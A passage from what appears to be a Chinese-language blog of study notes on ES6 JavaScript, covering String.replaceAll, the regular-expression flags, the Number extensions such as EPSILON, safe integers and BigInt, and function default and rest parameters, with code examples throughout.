&#x27;aa__cc&#x27;</span></span><br></pre></td></tr></table></figure><p>如果<code>searchValue</code>是一个不带有<code>g</code>修饰符的正则表达式，<code>replaceAll()</code>会报错。<code>replacement</code>除了为字符串，也可以是一个函数，该函数的返回值将替换掉第一个参数<code>searchValue</code>匹配的文本。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> str = <span class="string">&#x27;123abc456&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> regex = <span class="regexp">/(\d+)([a-z]+)(\d+)/g</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replacer</span>(<span class="params">match, p1, p2, p3, offset, string</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> [p1, p2, p3].join(<span class="string">&#x27; - &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">str.replaceAll(regex, replacer)</span><br><span class="line"><span class="comment">// 123 - abc - 456</span></span><br></pre></td></tr></table></figure><p>第一个参数<code>match</code>是捕捉到的匹配内容，第二个参数捕捉到是组匹配（有多少个组匹配，就有多少个对应的参数）如<code>p1</code>、<code>p2</code>、<code>p3</code>。此外，最后还可以添加两个参数，倒数第二个参数是捕捉到的内容在整个字符串中的位置，最后一个参数是原字符串。</p><h1 id="正则的扩展"><a href="#正则的扩展" class="headerlink" title="正则的扩展"></a>正则的扩展</h1><h2 id="1、RegExp-构造函数"><a href="#1、RegExp-构造函数" class="headerlink" title="1、RegExp 构造函数"></a>1、RegExp 构造函数</h2><p>ES5 不允许此时使用第二个参数添加修饰符，否则会报错。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> regex = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="regexp">/xyz/</span>, <span class="string">&#x27;i&#x27;</span>);</span><br></pre></td></tr></table></figure><p>ES6 改变了这种行为。如果<code>RegExp</code>构造函数第一个参数是一个正则对象，那么可以使用第二个参数指定修饰符。而且，返回的正则表达式会忽略原有的正则表达式的修饰符，只使用新指定的修饰符。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="regexp">/abc/ig</span>, <span class="string">&#x27;i&#x27;</span>).flags</span><br><span class="line"><span class="comment">// &quot;i&quot;</span></span><br></pre></td></tr></table></figure><h2 id="2、字符串的正则方法"><a href="#2、字符串的正则方法" class="headerlink" title="2、字符串的正则方法"></a>2、字符串的正则方法</h2><p>ES6 将<code>match()</code>、<code>replace()</code>、<code>search()</code>和<code>split()</code> 4 个方法，在语言内部全部调用<code>RegExp</code>的实例方法，从而做到所有与正则相关的方法，全都定义在<code>RegExp</code>对象上。</p><ul><li><code>String.prototype.match</code> 调用 <code>RegExp.prototype[Symbol.match]</code></li><li><code>String.prototype.replace</code> 调用 <code>RegExp.prototype[Symbol.replace]</code></li><li><code>String.prototype.search</code> 调用 <code>RegExp.prototype[Symbol.search]</code></li><li><code>String.prototype.split</code> 调用 <code>RegExp.prototype[Symbol.split]</code></li></ul><h2 id="3、u-修饰符"><a href="#3、u-修饰符" class="headerlink" title="3、u 修饰符"></a>3、u 修饰符</h2><p>ES6 对正则表达式添加了<code>u</code>修饰符，含义为“Unicode 模式”，用来正确处理大于<code>\uFFFF</code>的 Unicode 字符。</p><h2 id="4、y-修饰符（”粘连”修饰符）"><a href="#4、y-修饰符（”粘连”修饰符）" class="headerlink" title="4、y 修饰符（”粘连”修饰符）"></a>4、y 修饰符（”粘连”修饰符）</h2><p><code>y</code>修饰符的作用与<code>g</code>修饰符类似，也是全局匹配，后一次匹配都从上一次匹配成功的下一个位置开始。不同之处在于，<code>g</code>修饰符只要剩余位置中存在匹配就可，而<code>y</code>修饰符确保匹配必须从剩余的第一个位置开始，这也就是“粘连”的涵义。</p><h2 id="5、RegExp-prototype-flags-属性"><a href="#5、RegExp-prototype-flags-属性" class="headerlink" title="5、RegExp.prototype.flags 属性"></a>5、RegExp.prototype.flags 属性</h2><p>ES6 为正则表达式新增了<code>flags</code>属性，会返回正则表达式的修饰符。</p><h2 id="6、s-修饰符：dotAll-模式"><a href="#6、s-修饰符：dotAll-模式" class="headerlink" title="6、s 修饰符：dotAll 模式"></a>6、s 修饰符：dotAll 模式</h2><h1 id="数值的扩展"><a href="#数值的扩展" class="headerlink" title="数值的扩展"></a>数值的扩展</h1><h2 id="1、二进制和八进制表示法"><a href="#1、二进制和八进制表示法" class="headerlink" title="1、二进制和八进制表示法"></a>1、二进制和八进制表示法</h2><p>ES6 提供了二进制和八进制数值的新的写法，分别用前缀<code>0b</code>（或<code>0B</code>）和<code>0o</code>（或<code>0O</code>）表示。</p><p>如果要将<code>0b</code>和<code>0o</code>前缀的字符串数值转为十进制，要使用<code>Number</code>方法。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>(<span class="string">&#x27;0b111&#x27;</span>)  <span class="comment">// 7</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="string">&#x27;0o10&#x27;</span>)  <span class="comment">// 8</span></span><br></pre></td></tr></table></figure><h2 id="2、Number-isFinite-Number-isNaN"><a href="#2、Number-isFinite-Number-isNaN" class="headerlink" title="2、Number.isFinite(), Number.isNaN()"></a>2、Number.isFinite(), Number.isNaN()</h2><p><code>Number.isFinite()</code>用来检查一个数值是否为有限的（finite），即不是<code>Infinity</code>。如果参数类型不是数值，<code>Number.isFinite</code>一律返回<code>false</code>。</p><p><code>Number.isNaN()</code>用来检查一个值是否为<code>NaN</code>。如果参数类型不是<code>NaN</code>，<code>Number.isNaN</code>一律返回<code>false</code>。</p><p>它们与传统的全局方法<code>isFinite()</code>和<code>isNaN()</code>的区别在于，传统方法先调用<code>Number()</code>将非数值的值转为数值，再进行判断，而这两个新方法只对数值有效。</p><h2 id="3、Number-parseInt-Number-parseFloat"><a href="#3、Number-parseInt-Number-parseFloat" class="headerlink" title="3、Number.parseInt(), Number.parseFloat()"></a>3、Number.parseInt(), Number.parseFloat()</h2><p>逐步减少全局性方法，使得语言逐步模块化。</p><h2 id="4、Number-isInteger"><a href="#4、Number-isInteger" class="headerlink" title="4、Number.isInteger()"></a>4、Number.isInteger()</h2><p>JavaScript 内部，整数和浮点数采用的是同样的储存方法，所以 25 和 25.0 被视为同一个值。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>.isInteger(<span class="number">25</span>) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Number</span>.isInteger(<span class="number">25.0</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>如果参数不是数值，<code>Number.isInteger</code>返回<code>false</code>。</p><p>注意，由于 JavaScript 采用 IEEE 754 标准，数值存储为64位双精度格式，数值精度最多可以达到 53 个二进制位（1 个隐藏位与 52 个有效位）。如果数值的精度超过这个限度，第54位及后面的位就会被丢弃，这种情况下，<code>Number.isInteger</code>可能会误判。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>.isInteger(<span class="number">3.0000000000000002</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>原因是这个小数的精度达到了小数点后16个十进制位，转成二进制位超过了53个二进制位，导致最后的那个<code>2</code>被丢弃了。</p><h2 id="5、Number-EPSILON"><a href="#5、Number-EPSILON" class="headerlink" title="5、Number.EPSILON"></a>5、Number.EPSILON</h2><p>它表示 1 与大于 1 的最小浮点数之间的差。</p><p>对于 64 位浮点数来说，大于 1 的最小浮点数相当于二进制的<code>1.00..001</code>，小数点后面有连续 51 个零。这个值减去 1 之后，就等于 2 的 -52 次方。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>.EPSILON === <span class="built_in">Math</span>.pow(<span class="number">2</span>, -<span class="number">52</span>)</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>引入一个这么小的量的目的，在于为浮点数计算，设置一个误差范围。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">0.1</span> + <span class="number">0.2</span></span><br><span class="line"><span class="comment">// 0.30000000000000004</span></span><br><span class="line"></span><br><span class="line"><span class="number">0.1</span> + <span class="number">0.2</span> - <span class="number">0.3</span></span><br><span class="line"><span class="comment">// 5.551115123125783e-17</span></span><br></pre></td></tr></table></figure><p><code>Number.EPSILON</code>可以用来设置“能够接受的误差范围”。比如，误差范围设为 2 的-50 次方（即<code>Number.EPSILON * Math.pow(2, 2)</code>），即如果两个浮点数的差小于这个值，我们就认为这两个浮点数相等。</p><p>因此，<code>Number.EPSILON</code>的实质是<strong>一个可以接受的最小误差范围</strong>。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">withinErrorMargin</span> (<span class="params">left, right</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.abs(left - right) &lt; <span class="built_in">Number</span>.EPSILON * <span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">0.1</span> + <span class="number">0.2</span> === <span class="number">0.3</span> <span class="comment">// false</span></span><br><span class="line">withinErrorMargin(<span class="number">0.1</span> + <span class="number">0.2</span>, <span class="number">0.3</span>) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.1</span> + <span class="number">1.3</span> === <span class="number">2.4</span> <span class="comment">// false</span></span><br><span class="line">withinErrorMargin(<span class="number">1.1</span> + <span class="number">1.3</span>, <span class="number">2.4</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h2 id="6、安全整数和-Number-isSafeInteger"><a href="#6、安全整数和-Number-isSafeInteger" class="headerlink" title="6、安全整数和 Number.isSafeInteger()"></a>6、安全整数和 Number.isSafeInteger()</h2><p>JavaScript 能够准确表示的整数范围在<code>-2^53</code>到<code>2^53</code>之间（不含两个端点），超过这个范围，无法精确表示这个值。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">53</span>) <span class="comment">// 9007199254740992</span></span><br><span class="line"></span><br><span class="line"><span class="number">9007199254740992</span>  <span class="comment">// 9007199254740992</span></span><br><span class="line"><span class="number">9007199254740993</span>  <span class="comment">// 9007199254740992</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">53</span>) === <span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">53</span>) + <span class="number">1</span></span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>ES6 引入了<code>Number.MAX_SAFE_INTEGER</code>和<code>Number.MIN_SAFE_INTEGER</code>这两个常量，用来表示这个范围的上下限。</p><p><code>Number.isSafeInteger()</code>则是用来判断一个整数是否落在这个范围之内。这个函数的实现很简单，就是跟安全整数的两个边界值比较一下（同时验证参与运算的每个值）。</p><h2 id="7、BigInt-数据类型"><a href="#7、BigInt-数据类型" class="headerlink" title="7、BigInt 数据类型"></a>7、BigInt 数据类型</h2><p>ES2020 引入了一种新的数据类型 BigInt（大整数），这是 ECMAScript 的第八种数据类型。BigInt 只用来表示整数，没有位数的限制，任何位数的整数都可以精确表示。</p><p>为了与 Number 类型区别，BigInt 类型的数据必须添加后缀<code>n</code>。BigInt 同样可以使用各种进制表示，都要加上后缀<code>n</code>。</p><p>BigInt 与普通整数是两种值，它们之间并不相等。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">42n</span> === <span class="number">42</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure><h1 id="函数的扩展"><a href="#函数的扩展" class="headerlink" title="函数的扩展"></a>函数的扩展</h1><h2 id="1、函数参数的默认值"><a href="#1、函数参数的默认值" class="headerlink" title="1、函数参数的默认值"></a>1、函数参数的默认值</h2><h3 id="基本用法-3"><a href="#基本用法-3" class="headerlink" title="基本用法"></a>基本用法</h3><p>ES6 允许为函数的参数设置默认值，即直接写在参数定义的后面。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params">x, y = <span class="string">&#x27;World&#x27;</span></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(x, y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">log(<span class="string">&#x27;Hello&#x27;</span>) <span class="comment">// Hello World</span></span><br><span class="line">log(<span class="string">&#x27;Hello&#x27;</span>, <span class="string">&#x27;China&#x27;</span>) <span class="comment">// Hello China</span></span><br><span class="line">log(<span class="string">&#x27;Hello&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment">// Hello</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//另一个例子</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Point</span>(<span class="params">x = <span class="number">0</span>, y = <span class="number">0</span></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.x = x;</span><br><span class="line">  <span class="built_in">this</span>.y = y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> Point();</span><br><span class="line">p <span class="comment">// &#123; x: 0, y: 0 &#125;</span></span><br></pre></td></tr></table></figure><p>参数变量是默认声明的，所以不能用<code>let</code>或<code>const</code>再次声明。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">x = <span class="number">5</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> x = <span class="number">1</span>; <span class="comment">// error</span></span><br><span class="line">  <span class="keyword">const</span> x = <span class="number">2</span>; <span class="comment">// error</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>且使用参数默认值时，函数不能有同名参数。此外，参数默认值不是传值的，而是每次都重新计算默认值表达式的值。也就是说，参数默认值是惰性求值的。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> x = <span class="number">99</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">p = x + <span class="number">1</span></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo() <span class="comment">// 100</span></span><br><span class="line"></span><br><span class="line">x = <span class="number">100</span>;</span><br><span class="line">foo() <span class="comment">// 101</span></span><br></pre></td></tr></table></figure><p>上面代码中，参数<code>p</code>的默认值是<code>x + 1</code>。这时，每次调用函数<code>foo</code>，都会重新计算<code>x + 1</code>，而不是默认<code>p</code>等于 100。</p><h3 id="与解构赋值默认值结合使用"><a href="#与解构赋值默认值结合使用" class="headerlink" title="与解构赋值默认值结合使用"></a>与解构赋值默认值结合使用</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">&#123;x, y = <span class="number">5</span>&#125;</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(x, y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(&#123;&#125;) <span class="comment">// undefined 5</span></span><br><span class="line">foo(&#123;<span class="attr">x</span>: <span class="number">1</span>&#125;) <span class="comment">// 1 5</span></span><br><span class="line">foo(&#123;<span class="attr">x</span>: <span class="number">1</span>, <span class="attr">y</span>: <span class="number">2</span>&#125;) <span class="comment">// 1 2</span></span><br><span class="line">foo() <span class="comment">// TypeError: Cannot read property &#x27;x&#x27; of undefined</span></span><br></pre></td></tr></table></figure><p>上面代码只使用了对象的解构赋值默认值，没有使用函数参数的默认值。只有当函数<code>foo</code>的参数是一个对象时，变量<code>x</code>和<code>y</code>才会通过解构赋值生成。如果函数<code>foo</code>调用时没提供参数，变量<code>x</code>和<code>y</code>就不会生成，从而报错。通过提供函数参数的默认值，就可以避免这种情况。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">&#123;x, y = <span class="number">5</span>&#125; = &#123;&#125;</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(x, y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo() <span class="comment">// undefined 5</span></span><br></pre></td></tr></table></figure><p>上面代码指定，如果没有提供参数，函数<code>foo</code>的参数默认为一个空对象。</p><p>下面是另一个解构赋值默认值的例子。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params">url, &#123; body = <span class="string">&#x27;&#x27;</span>, method = <span class="string">&#x27;GET&#x27;</span>, headers = &#123;&#125; &#125;</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(method);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fetch(<span class="string">&#x27;http://example.com&#x27;</span>, &#123;&#125;)</span><br><span class="line"><span class="comment">// &quot;GET&quot;</span></span><br><span class="line"></span><br><span class="line">fetch(<span class="string">&#x27;http://example.com&#x27;</span>)</span><br><span class="line"><span class="comment">// 报错</span></span><br></pre></td></tr></table></figure><p>上面代码中，如果函数<code>fetch</code>的第二个参数是一个对象，就可以为它的三个属性设置默认值。这种写法不能省略第二个参数，如果结合函数参数的默认值，就可以省略第二个参数。这时，就出现了双重默认值。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params">url, &#123; body = <span class="string">&#x27;&#x27;</span>, method = <span class="string">&#x27;GET&#x27;</span>, headers = &#123;&#125; &#125; = &#123;&#125;</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(method);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fetch(<span class="string">&#x27;http://example.com&#x27;</span>)</span><br><span class="line"><span class="comment">// &quot;GET&quot;</span></span><br></pre></td></tr></table></figure><p>上面代码中，函数<code>fetch</code>没有第二个参数时，函数参数的默认值就会生效，然后才是解构赋值的默认值生效，变量<code>method</code>才会取到默认值<code>GET</code>。</p><h3 id="参数默认值的位置"><a href="#参数默认值的位置" class="headerlink" title="参数默认值的位置"></a>参数默认值的位置</h3><p>通常情况下，定义了默认值的参数，应该是函数的尾参数。</p><p>如果传入<code>undefined</code>，将触发该参数等于默认值，<code>null</code>则没有这个效果。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">x = <span class="number">5</span>, y = <span class="number">6</span></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(x, y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(<span class="literal">undefined</span>, <span class="literal">null</span>)</span><br><span class="line"><span class="comment">// 5 null</span></span><br></pre></td></tr></table></figure><h3 id="函数的-length-属性"><a href="#函数的-length-属性" class="headerlink" title="函数的 length 属性"></a>函数的 length 属性</h3><p>指定了默认值以后，函数的<code>length</code>属性，将返回没有指定默认值的参数个数。也就是说，指定了默认值后，<code>length</code>属性将失真。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;&#125;).length <span class="comment">// 1</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">a = <span class="number">5</span></span>) </span>&#123;&#125;).length <span class="comment">// 0</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">a, b, c = <span class="number">5</span></span>) </span>&#123;&#125;).length <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><p>这是因为<code>length</code>属性的含义是，该函数<strong>预期传入的参数个数</strong>。某个参数指定默认值以后，预期传入的参数个数就不包括这个参数了。</p><p>如果设置了默认值的参数不是尾参数，那么<code>length</code>属性也不再计入后面的参数了。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">a = <span class="number">0</span>, b, c</span>) </span>&#123;&#125;).length <span class="comment">// 0</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">a, b = <span class="number">1</span>, c</span>) </span>&#123;&#125;).length <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3><p>一旦设置了参数的默认值，函数进行声明初始化时，参数会形成一个单独的作用域（context）。等到初始化结束，这个作用域就会消失。这种语法行为，在不设置参数默认值时，是不会出现的。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x, y = x</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(<span class="number">2</span>) <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><p>上面代码中，参数<code>y</code>的默认值等于变量<code>x</code>。调用函数<code>f</code>时，参数形成一个单独的作用域。在这个作用域里面，默认值变量<code>x</code>指向第一个参数<code>x</code>，而不是全局变量<code>x</code>，所以输出是<code>2</code>。</p><p>再看下面的例子。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> x = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">y = x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> x = <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f() <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><p>上面代码中，函数<code>f</code>调用时，参数<code>y = x</code>形成一个单独的作用域。这个作用域里面，变量<code>x</code>本身没有定义，所以指向外层的全局变量<code>x</code>。函数调用时，函数体内部的局部变量<code>x</code>影响不到默认值变量<code>x</code>。</p><p>如果参数的默认值是一个函数，该函数的作用域也遵守这个规则。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> foo = <span class="string">&#x27;outer&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params">func = () =&gt; foo</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> foo = <span class="string">&#x27;inner&#x27;</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(func());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar(); <span class="comment">// outer</span></span><br></pre></td></tr></table></figure><p>上面代码中，函数<code>bar</code>的参数<code>func</code>的默认值是一个匿名函数，返回值为变量<code>foo</code>。函数参数形成的单独作用域里面，并没有定义变量<code>foo</code>，所以<code>foo</code><strong>指向外层的全局变量</strong><code>foo</code>，因此输出<code>outer</code>。</p><p>下面是一个更复杂的例子。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">x, y = <span class="keyword">function</span>() &#123; x = <span class="number">2</span>; &#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> x = <span class="number">3</span>;</span><br><span class="line">  y();</span><br><span class="line">  <span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo() <span class="comment">// 3</span></span><br><span class="line">x <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><p>上面代码中，函数<code>foo</code>的参数形成一个单独作用域。这个作用域里面，首先声明了变量<code>x</code>，然后声明了变量<code>y</code>，<code>y</code>的默认值是一个匿名函数。这个匿名函数内部的变量<code>x</code>，指向同一个作用域的第一个参数<code>x</code>。函数<code>foo</code>内部又声明了一个内部变量<code>x</code>，该变量与第一个参数<code>x</code>由于不是同一个作用域，所以不是同一个变量，因此执行<code>y</code>后，内部变量<code>x</code>和外部全局变量<code>x</code>的值都没变。</p><p>如果将<code>var x = 3</code>的<code>var</code>去除，函数<code>foo</code>的内部变量<code>x</code>就指向第一个参数<code>x</code>，与匿名函数内部的<code>x</code>是一致的，所以最后输出的就是<code>2</code>，而外层的全局变量<code>x</code>依然不受影响。</p><h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><p>利用参数默认值，可以指定某一个参数不得省略，如果省略就抛出一个错误。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">throwIfMissing</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;Missing parameter&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">mustBeProvided = throwIfMissing()</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> mustBeProvided;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo()</span><br><span class="line"><span class="comment">// Error: Missing parameter</span></span><br></pre></td></tr></table></figure><p>上面代码的<code>foo</code>函数，如果调用的时候没有参数，就会调用默认值<code>throwIfMissing</code>函数，从而抛出一个错误。</p><p>还可以将参数默认值设为<code>undefined</code>，表明这个参数是可以省略的。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">optional = <span class="literal">undefined</span></span>) </span>&#123; ··· &#125;</span><br></pre></td></tr></table></figure><h2 id="2、rest-参数"><a href="#2、rest-参数" class="headerlink" title="2、rest 参数"></a>2、rest 参数</h2><p>ES6 引入 rest 参数（形式为<code>...变量名</code>），用于获取函数的多余参数，这样就不需要使用<code>arguments</code>对象了。rest 参数搭配的变量是一个数组，该变量将多余的参数放入数组中。</p><p>rest 参数代替<code>arguments</code>变量的例子。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// arguments变量的写法 arguments对象是类数组。所以必须使用Array.prototype.slice.call先将其转为数组。 或Array.form()？</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sortNumbers</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>).sort();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// rest参数的写法</span></span><br><span class="line"><span class="keyword">const</span> sortNumbers = <span class="function">(<span class="params">...numbers</span>) =&gt;</span> numbers.sort();</span><br></pre></td></tr></table></figure><p>利用 rest 参数改写数组<code>push</code>方法的例子。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">push</span>(<span class="params">array, ...items</span>) </span>&#123;</span><br><span class="line">  items.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>) </span>&#123;</span><br><span class="line">    array.push(item);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [];</span><br><span class="line">push(a, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>注意，rest 参数之后不能再有其他参数（即只能是最后一个参数）。函数的<code>length</code>属性，不包括 rest 参数。</p><h2 id="3、严格模式"><a href="#3、严格模式" class="headerlink" title="3、严格模式"></a>3、严格模式</h2><p>ES2016 规定只要函数参数使用了默认值、解构赋值、或者扩展运算符，那么函数内部就不能显式设定为严格模式，否则会报错。</p><p>这样规定的原因是，函数内部的严格模式，同时适用于函数体和函数参数。但是，函数执行的时候，先执行函数参数，然后再执行函数体。这样就有一个不合理的地方，只有从函数体之中，才能知道参数是否应该以严格模式执行，但是参数却应该先于函数体执行。</p><h2 id="4、name-属性"><a href="#4、name-属性" class="headerlink" title="4、name 属性"></a>4、name 属性</h2><p>函数的<code>name</code>属性，返回该函数的函数名。如果将一个匿名函数赋值给一个变量，ES5 的<code>name</code>属性，会返回空字符串，而 ES6 的<code>name</code>属性会返回实际的函数名。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES5</span></span><br><span class="line">f.name <span class="comment">// &quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6</span></span><br><span class="line">f.name <span class="comment">// &quot;f&quot;</span></span><br></pre></td></tr></table></figure><p><code>Function</code>构造函数返回的函数实例，<code>name</code>属性的值为<code>anonymous</code>。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">new</span> <span class="built_in">Function</span>).name <span class="comment">// &quot;anonymous&quot;</span></span><br></pre></td></tr></table></figure><p><code>bind</code>返回的函数，<code>name</code>属性值会加上<code>bound</code>前缀。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">foo.bind(&#123;&#125;).name <span class="comment">// &quot;bound foo&quot;</span></span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;).bind(&#123;&#125;).name <span class="comment">// &quot;bound &quot;</span></span><br></pre></td></tr></table></figure><h2 id="5、箭头函数"><a 